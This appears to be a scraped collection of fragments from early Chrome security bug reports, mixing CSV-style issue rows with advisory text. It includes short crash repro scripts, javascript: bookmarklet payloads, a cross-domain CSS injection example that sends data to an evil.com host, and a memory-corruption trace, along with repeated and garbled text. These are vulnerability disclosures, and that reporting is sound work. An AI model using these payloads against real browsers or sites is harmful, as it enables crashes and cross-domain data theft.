Here comes the report: Details: - Type of Issue: Buffer Overflow. - Affected Software: Google Chrome 0.2.149.27. - Exploitation Environment: Google Chrome (Language: Vietnamese) on Windows XP SP2. - Impact: Remote code execution - Description: The vulnerability is caused due to a boundary error when handling the Ã¢ÂÂSaveAsÃ¢Â?function. On saving a malicious page with an overly long title (&lt;title&gt; tag in HTML)  the program causes a stack-based overflow and makes it possible for attackers to execute arbitrary code on usersÃ¢Â?systems. - How an attacker could exploit the issue : To exploit the Vulnerability  a hacker might construct a specially crafted Web page  which contains malicious code. He then tricks users into visiting his Website and convinces them to save this Page. Right after that  the code would be executed  giving him the privilege to make use of the affected system. - Exploitation code: Proof of Concept: Crash (Attached to this document). - Researcher: AnhLD Ã¢Â?SVRT member. - About SVRT : Bkis Vietnam is a security research center in Vietnam.

The subdomain is highlighted     Phishing emails commonly contain links like http://yourbank.com.badsite.com/ to try to make you think it's a genuine link to yourbank.com  when in fact it's a link to badsite.com URL highlighting can make this type of misdirection obvious by highlighting the domain and not the subdomain.

2965,2965,3012,30-Sep-08,Issue 3012 : Security: window.open+window.close memory corruption 2     &nbsp;   skylined@chromium.org    Opening and immediately closing windows in quick succession seems to be an easy way to make Google Chrome and Apple Safari create large amounts of USER and GDI objects and eventually causes memory corruption. The end result varies every time I run the PoC; mostly it is complete corruption of registers  including EIP and ESP. I'm not sure if the objects have anything to do with the memory corruption - it may be an unrelated side effect. I noticed that the number of USER and GDI objects can get pretty high while running the PoC; several thousand. According to http://msdn.microsoft.com/en-us/library/ms725486(VS.85).aspx and http://msdn.microsoft.com/en-us/library/ms724291(VS.85).aspx   there are two a registry key that limit the number of USER and GDI objects a process can create; the values on my Vista x64 test machine are 10 000 for both. However  I have not seen this limit being reached during any of my tests. Also  the number of objects at the time of the crash seems to vary. I can't see this being the cause of the crash. Since both browsers crash in a completely different ways every time I run the PoC  I've omitted a stack dump. Repro for Chrome: &lt;SCRIPT&gt; setInterval(&quot;window.open('javascript:window.close()');&quot;  1); &lt;/SCRIPT&gt; http://skypher.com/SkyLined/Repro/Chrome/open+close%20memory% 20corruption/repro.html For Safari 3.0 it seems to be easier to trigger this with a small window  which is why I have create a separate repro that gives you time to resize the window before you start it: http://skypher.com/SkyLined/Repro/Chrome/open+close%20memory% 20corruption/Safari.html On my XPsp3 test VM with Safari 4.0 (528.1.1) and WebKit Nightly r36882 (september 25th)  it does not seem to trigger with the above repro. I think I've found a way to do so using this: &lt;SCRIPT&gt; while (true) try { window.open('javascript:close()'); } catch (e) {} &lt;/SCRIPT&gt; http://skypher.com/SkyLined/Repro/Chrome/open+close%20memory% 20corruption/Nightly.html I am not sure if this is the same issue: this opens up ~120 Safari windows  uses quite a bit of CPU for a while and then either dies or closes all but the first window. I've tried to run it under windbg  but I get this message as soon as I have ~120 windows open: Localizable string &quot;localized string not found&quot; not found in strings table &quot;Localizable&quot; of bundle CFBundle 0143F730 &lt;C:\Program Files\Safari\Safari.resources&gt; (DLL  loaded).eax=00000001 ebx=00000000 ecx=7c8137ed edx=7c97d600 esi=7c90de50 edi=00000001 eip=7c90e4f4 esp=0012dc10 ebp=0012dd0c iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 ntdll!KiFastSystemCallRet: 7c90e4f4 c3 ret If I try to continue the process  I get this: 0:000&gt; gn ^ No runnable debuggees error in 'gn' ...which is odd because there are still Safari windows open. I've tried to use windbg as a post-mortem/JIT debugger  but nothing happens. I've seen that before when the stack in the process is exhausted or corrupt  causing the exception handler to fail completely. The end result is that I have not a clue what the problem is. It may be easier to track it down in Chrome/Safari 3.0 then in Nightly  but I'll leave that to you. For Safari  the memory corruption may be controlable and allow an attacker to execute arbitrary code with the priviliges of the user running the browser. For Chrome  the same applies but the sandbox mitigates the risk of code execution; an attacker would only be able to run code in the sandbox  which gives him/her very limited access to the system. ,1,Issue 3012 : Security: window.open+window.close memory corruption 2     &nbsp,skylined@chromium.org    Opening and immediately closing windows in quick succession seems to be an easy way to make Google Chrome and Apple Safari create large amounts of USER and GDI objects and eventually causes memory corruption.

5585,5585,5787,22-Dec-08,Issue 5787 : Chrome allows to drag javascript: URLs into bookmarks bar 2     &nbsp;   m...@mikx.de    Chrome allows to drag &quot;javascript:&quot; URLs into the bookmarks bar  just like normal &quot;http:&quot; URLs. This way users can get tricked into executing arbitrary JavaScript on whatever domain is currently loaded in the active tab when clicking on the bookmarked link. A simple example on how to leverage that fact is to sniff the content of &quot;chrome-resource://new-tab&quot; Ã¢Â?which usually would show the personal homepage. Given the history function of that page you could scan frequently used pages of that user (and potentially sniff URL parameters like sessions or password). Example (drag to bookmarks bar  click on homepage): &lt;a href=&quot;javascript:alert(document.body.innerHTML)&quot;&gt;drag&lt;/a&gt; A more complex example would be a script that really forwards to a destination  dragging a linked logo of news site or such into the bookmarks bar will be a frequently used feature for dragging bookmarks. &lt;a href=&quot;javascript:if(false){}else{document.location='http://news.google.com' }&quot;&gt;Google News&lt;/a&gt; The if statement could for example sniff for a certain domain and than interact with the website (e.g. to steal session or modify data). The example below interacts with the DOM of blogger.com when you are on your homepage Ã¢Â?in all other cases it forwards to new.google.com: &lt;a href=&quot;javascript:if(document.location==' http://www.blogger.com/home'){alert (document.body.innerHTML)}else{document.location='http://news.google.com' &gt;Google News&lt;/a&gt; A user might never realize that every click on the bookmark carries the risk of running malicious code on the open website. Mitigating factors: 1. The risk of getting such a bookmark(let) installed is relatively low  although social engineering tricks might work well on such a simple task like dragging a link. 2. The tooltip of the bookmark shows that it is a JavaScript URL. Not that anybody who would fall for this trick would really understand what that means. Internet Explorer 7 does not allows dragging of JavaScript URLs  it even generates a warning message when you try to add a javascrip: URL via a context menu. Both seem to be a reasonable counter measure to avoid people hijack bookmarks. ,1,Issue 5787 : Chrome allows to drag javascript: URLs into bookmarks bar 2     &nbsp,m...@mikx.de    Chrome allows to drag &quot javascript:&quot URLs into the bookmarks bar  just like normal &quot http:&quot URLs.

9432,9432,9877,8-Apr-09,Issue 9877 : Security: cross domain thefts via CSS string property injection 2     &nbsp;   scarybeasts    This bug is kind of annoying. The hope is that something can be done at the browser level. We really don't want to have to make sweeping changes to lots of our applications  and generally burden web apps with more web browser issues. This affects Chrome  Safari  IE  Opera and FF. But let's keep this bug Chrome-private whilst we debate what can be done (and protect our customers first :) The attack involves cross-domain CSS stylesheet loading. Because the CSS parser is very lax  it will skip over any amount of preceding and following junk  in its quest to find a valid selector. Here is an example of a valid selector: body { background-image: url(' http://www.evil.com/blah'); } And here is an example of a valid selector embedded in an XML document (this is a paraphrase of a real example low-severity attack): &lt;photo_comment from=&quot;evil&quot;&gt; blah { blah:0 } body { background-image: url(' http://www.evil.com/&lt;/photo_comment&gt;&lt;photo_comment from=&quot;trusted&quot; url=&quot;url_with_key_to_hidden_photo&quot;&gt;some secret comment&lt;/photo_comment&gt;&lt;photo_comment from=&quot;evil&quot;&gt; ');}&lt;/photo_comment&gt; As you can see  if the attacker can inject a couple of strings into a trusted response  there is a useful attack here. The data is stolen cross domain with e.g. window.getComputedStyle(body_element  null).getPropertyValue('background-image'); (Note that the seemingly redundant blah { blah:0 } selector is to resync the CSS parser to make sure the evil descriptor parses properly). There are a surprising number of places in our products where an attacker can do this. It can apply to HTML  XML  JSON  XHTML  etc. The main common construct that prevents exploitation is newlines. Obviously  newlines cannot be considered a defense! The exploitable places in Google include some JSON and XML data APIs that return responses on a single line. Some of our XHTML / HTML just happens to be emitted this way too. Regarding JSON and XML  note that it is not currently a security requirement to escape ' and &quot; (XML values) or ' (JSON values within double quoted strings). Nor should we make it a requirement. Regarding how to fix the browser  here are some starting ideas (from an ise-team brainstorm). 1) When loading cross-domain CSS  engage a stricter parsing mode that stops on first syntactic (but not sematic of course) errors. 2) Same as 1)  but also only engage when the MIME type is not CSS. 3) Some variant of 1) or 2) but only engage when X-Content-Type-Options: nosniff is seen (won't help most of the internet). 4) When loading cross-domain CSS  do not send cookies (probably breaks the internet :-/ ) Please  feel free to cc: additional people who may be able to help.

Here's some JavaScript that can be used to trigger the issue: &lt SCRIPT&gt oCanvas=document.createElement(&quot CANVAS&quot ) o2dContext=oCanvas.getContext(&quot 2d&quot ) o2dContext.transform(78 76 -6 0 -10000 9) o2dContext.translate(-55 0) o2dContext.rotate(1000) o2dContext.shadowBlur=1000 o2dContext.shadowOffsetX=1 o2dContext.clearRect(1 5 48 -21) &lt /SCRIPT&gt Here's more details: CdbFatalExceptionInfo(WriteAV()[arbitrary]@chrome!memset+0x65) (100% reproducable after 11 attempts  reducing) Attempt to write to arbitrary memory at arbitrary  instruction: 03b6bf35 8807 mov byte ptr [edi] al Registers: eax=000000ff ebx=03419b90 ecx=8b936f2d edx=00000001 esi=05fee548 edi=8b936f2d esp=05fee50c ebp=05fee534 eip=03b6bf35 Stack: ChildEBP RetAddr 05fee50c 03fc9abf chrome_28f0000!memset(unsigned char * dst = 0xffffcf15 &quot --- memory read error at address 0xffffcf15 ---&quot unsigned char value = 0x14 ''  unsigned long count = 1)+0x65 05fee534 03fbf403 chrome_28f0000!SkA8_Blitter::blitH(int x = - 12523  int y = 380692  int width = 1)+0x5f 05fee57c 03fbf27a chrome_28f0000!walk_edges(struct SkEdge * prevHead = 0x05fee5f0  SkPath::FillType fillType = kWinding_FillType (0)  class SkBlitter * blitter = 0x0d079020  int stop_y = 384133  &lt function&gt * proc = 0x00000000)+0xd3 05fee638 03fc0058 chrome_28f0000!sk_fill_path(class SkPath * path = 0x05feed98  struct SkIRect * clipRect = 0x00000000  class SkBlitter * blitter = 0x0d079020  int stop_y = 384133  int shiftEdgesUp = 0  class SkRegion * clipRgn = 0x05feee7c)+0x17a 05fee6c0 03fd6c4b chrome_28f0000!SkScan::FillPath(class SkPath * path = 0x05feed98  class SkRegion * clip = 0x05feee7c  class SkBlitter * blitter = 0x0d079020)+0xd8 05feebd0 03fb958a chrome_28f0000!SkScan::AntiFillPath(class SkPath * path = 0x05feed98  class SkRegion * clip = 0x05feee7c  class SkBlitter * blitter = 0x0d079020)+0xeb 05feedd4 03f8d912 chrome_28f0000!SkDraw::drawPath(class SkPath * origSrcPath = 0x05fef194  class SkPaint * paint = 0x05feee08  class SkMatrix * prePathMatrix = 0x00000000  bool pathIsMutable = false)+0x3ca 05feedf0 03fbdcfc chrome_28f0000!SkDraw::drawPath(class SkPath * src = 0x05fef194  class SkPaint * paint = 0x05feee08)+0x22 05feeee0 03fbd9e4 chrome_28f0000!draw_into_mask(struct SkMask * mask = 0x05feefa4  class SkPath * devPath = 0x05fef194)+0xfc 05feeef0 03fd6f62 chrome_28f0000!SkDraw::DrawToMask(class SkPath * devPath = 0x05fef194  struct SkIRect * clipBounds = 0x096af028  class SkMaskFilter * filter = 0x0d0a5020  class SkMatrix * filterMatrix = 0x0a14d04c  struct SkMask * mask = 0x05feefa4  SkMask::CreateMode mode = kComputeBoundsAndRenderImage_CreateMode (2))+0x94 05feefc4 03fb94dd chrome_28f0000!SkMaskFilter::filterPath(class SkPath * devPath = 0x05fef194  class SkMatrix * matrix = 0x0a14d04c  class SkRegion * clip = 0x096af028  class SkBounder * bounder = 0x00000000  class SkBlitter * blitter = 0x0d2d5020)+0x42 05fef1d0 03f8d912 chrome_28f0000!SkDraw::drawPath(class SkPath * origSrcPath = 0x05fef36c  class SkPaint * paint = 0x05fef518  class SkMatrix * prePathMatrix = 0x00000000  bool pathIsMutable = false)+0x31d 05fef1ec 03fb8d90 chrome_28f0000!SkDraw::drawPath(class SkPath * src = 0x05fef36c  class SkPaint * paint = 0x05fef518)+0x22 05fef3a0 03f8d8ae chrome_28f0000!SkDraw::drawRect(struct SkRect * rect = 0x05fef55c  class SkPaint * paint = 0x05fef518)+0xe0 05fef3b4 03f9066b chrome_28f0000!SkDevice::drawRect(class SkDraw * draw = 0x05fef3d4  struct SkRect * r = 0x05fef55c  class SkPaint * paint = 0x05fef518)+0x1e 05fef450 03688600 chrome_28f0000!SkCanvas::drawRect(struct SkRect * r = 0x05fef55c  class SkPaint * paint = 0x05fef518)+0xcb 05fef574 0352909d chrome_28f0000!WebCore::GraphicsContext::clearRect(class WebCore::FloatRect * rect = 0x05fef584)+0xf0 05fef5a0 02c07654 chrome_28f0000!WebCore::CanvasRenderingContext2D::clearRect(float x = 71  float y = -16  float width = 48  float height = 21)+0xad 05fef5f8 03419eb9 chrome_28f0000!WebCore::CanvasRenderingContext2DInternal::clearRectCallback (class v8::Arguments * args = 0x05fef658)+0xe4 05fef730 064f018b chrome_28f0000!v8::internal::Builtin_HandleApiCall(int __argc__ = 5  class v8::internal::Object ** __argv__ = 0x05fef760)+0x329 WARNING: Frame IP not in any known module.

The download animation is shown in the hidden popup. 4) The page closes the popup. The user is now downloading a file without him/her knowing about this. The only way a user can make sure this didn't happen is by checking the &quot;Downloads&quot; page every now and then.) The attacker could slow the download to a crawl to make sure it doesn't fill the disk or terminate while the user continues to browse the internet. The attacker now knows that the user is still using Chrome even if s/he leaves the malicious site. When Chrome closes  the connection is terminated and the attacker knows the user has closed Chrome. I think the leaked information is not that valuable so I'm filing this as low priority.

At the end of December DoS vulnerability in Mozilla Firefox 3.0.5 was found by Jeremy Brown ( http://websecurity.com.ua/2755/ ). After I checked at 23.12.2008 this vulnerability in different browsers  I found that this Denial of Service vulnerability also exists in Chrome 1.0.154.48. DoS: Original exploit ( http://www.milw0rm.com/exploits/7554 ). Use Google's cache because milw0rm.com is not working now (http://209.85.129.132/search? q=cache:aE09aeFDddMJ:www.milw0rm.com/exploits/7554+ http://www.milw0rm.com/e xploits/7554&amp;cd=1&amp;ct=clnk). With html file generated by this exploit in all affected browsers there is consuming of CPU resources (and some consuming of RAM resources  besides in those browsers  where there is no freeze  after closing of tab with exploit the memory is not released  so large amount of memory stays in use until closing of the browser). In Chrome 1.0.154.48 and previous versions the exploit leads to CPU Overload. But if to open empty tab and to close tab with the exploit  then on empty tab the browser can take 100% of CPU and freezes.

At the end of December DoS vulnerability in Mozilla Firefox 3.0.5 was found by Jeremy Brown ( http://websecurity.com.ua/2755/ ). After I checked at 23.12.2008 this vulnerability in different browsers  I found that this Denial of Service vulnerability also exists in Chrome 1.0.154.48. DoS: Original exploit ( http://www.milw0rm.com/exploits/7554 ). Use Google's cache because milw0rm.com is not working now (http://209.85.129.132/search q=cache:aE09aeFDddMJ:www.milw0rm.com/exploits/7554+ http://www.milw0rm.com/e xploits/7554&amp cd=1&amp ct=clnk). With html file generated by this exploit in all affected browsers there is consuming of CPU resources (and some consuming of RAM resources  besides in those browsers  where there is no freeze  after closing of tab with exploit the memory is not released  so large amount of memory stays in use until closing of the browser). In Chrome 1.0.154.48 and previous versions the exploit leads to CPU Overload. But if to open empty tab and to close tab with the exploit  then on empty tab the browser can take 100% of CPU and freezes.

The round corners are rendered with a black blackground with square corners. Also  the drop shadow seems much bigger than it should be.
